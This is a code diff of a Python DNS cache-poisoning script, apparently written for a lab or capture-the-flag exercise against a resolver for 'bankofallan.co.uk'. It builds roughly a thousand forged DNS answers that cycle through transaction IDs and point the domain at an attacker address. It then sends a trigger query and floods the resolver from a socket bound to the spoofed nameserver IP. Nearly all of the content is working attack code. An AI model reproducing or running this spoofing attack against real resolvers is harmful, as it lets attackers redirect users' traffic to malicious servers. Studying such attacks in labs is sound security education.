@@ -1,9 +1,17 @@
-from threading import Thread
-import time
-from random import randint
-from scapy.layers.inet import *
 from scapy.layers.dns import *
 from scapy.all import *
+########################################### TODO in
+from dnslib import *
+from threading import Thread
+
+
+badguyDNSport = 53
+flagPort = 1337
+ip_DNS = "192.168.56.101"
+ip_attacker = "192.168.56.1"
+ip_NS = "10.0.0.1"
+site = "wwwtest.bankofallan.co.uk"
+########################################### out
 
 DNS_SPOOF_IP = "10.0.0.1"
 BAD_DNS_IP = "192.168.56.1"
@@ -111,9 +119,9 @@ def master_job():
                 # preparo i pacchetti
 
                 spoof = IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="spoof.bankofallan.co.uk"))
-                PACKETS.append(spoof)
+                #PACKETS.append(spoof)
 
-                for index in range(1, 999):
+                '''for index in range(1, 999):
                         pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / \
                               DNS(id=((Q_ID + index) % 65535), qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
                                   qdcount=1, ancount=1,
@@ -125,7 +133,30 @@ def master_job():
                                   ar=(DNSRR(rrname='bankofallan.co.uk', type='A', rclass='IN', ttl=60000, rdlen=4,
                                             rdata=BAD_DNS_IP)) /
                                      DNSRR(rrname='.', type=41, rclass=4096, ttl=32768, rdlen=0, rdata=''))
-                        PACKETS.append(pkt)
+                        PACKETS.append(pkt)'''
+                for index in range(1, 999):
+                        '''DNS_pkt = DNS(id=((Q_ID + index) % 65535), qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L,
+                                  rcode='ok',
+                                  qdcount=1, ancount=1,
+                                  nscount=0, arcount=0,
+                                  qd=(DNSQR(qname='bankofallan.co.uk', qtype='NS', qclass='IN')),
+                                  an=None,
+                                  ns=(DNSRR(rrname='co.uk', type='NS', rclass='IN', ttl=60000, rdlen=24,
+                                            rdata='bankofallan.co.uk')),
+                                  ar=(DNSRR(rrname='bankofallan.co.uk', type='A', rclass='IN', ttl=60000, rdlen=4,
+                                            rdata=BAD_DNS_IP)) /
+                                     DNSRR(rrname='.', type=41, rclass=4096, ttl=32768, rdlen=0, rdata=''))'''
+                        DNS_pkt = DNSRecord(DNSHeader(id=(Q_ID + index), qr=1, aa=1, ra=1), q=DNSQuestion(site), a=RR("bankofallan.co.uk", QTYPE.A, rdata=A(BAD_DNS_IP), ttl=6000)).pack()
+                        PACKETS.append(DNS_pkt)
+
+                #send(spoof)
+                ################################ TODO in
+                sock_dns.sendto(DNSRecord.question("123.bankofallan.co.uk").pack(), (ip_DNS, 53))
+
+                for pkt in PACKETS:
+
+                        fakeDNS_sock.sendto(pkt, (ip_DNS, PORT_NUMBER))
+                ################################ out
 
                 # TODO controllare le porte
                 # PACKETS.insert(0, (IP(dst=VULN_DNS_IP) / UDP(sport=(random.randint(40000, 50000)), dport=53) / DNS(rd=1, qd=DNSQR(qname="spoof.bankofallan.co.uk"))))
@@ -134,7 +165,7 @@ def master_job():
 
                 # TODO forse verbose=0
                 #time1 = time.time()
-                send(PACKETS)
+                #send(PACKETS)
                 #time2 = time.time()
                 #print ("\t\t\t\ttime elapsed: " + str(time2 - time1))
 
@@ -152,21 +183,17 @@ def master_job():
 
 ############################ MAIN ###########################
 
-# inizzializzazione treno pacchetti
-'''pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / \
-        DNS(id= 0, qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
-            qdcount=1, ancount=1,
-            nscount=0, arcount=0,
-            qd=(DNSQR(qname='bankofallan.co.uk', qtype='NS', qclass='IN')),
-            an=None,
-            ns=(DNSRR(rrname='co.uk', type='NS', rclass='IN', ttl=60000, rdlen=24,
-                      rdata='bankofallan.co.uk')),
-            ar=(DNSRR(rrname='bankofallan.co.uk', type='A', rclass='IN', ttl=60000, rdlen=4,
-                      rdata=BAD_DNS_IP)) /
-               DNSRR(rrname='.', type=41, rclass=4096, ttl=32768, rdlen=0, rdata=''))
+# inizzializzazione socket dnslib
+######################### TODO in
+fakeDNS_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+fakeDNS_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+fakeDNS_sock.bind(("10.0.0.1", 53))
 
-for i in range(1, 1000):
-        PACKETS.append(pkt)
-#print ("len1: " + str(len(PACKETS)))'''
+sock_dns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock_dns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+#########################out
+
+
+
 
 master_job()
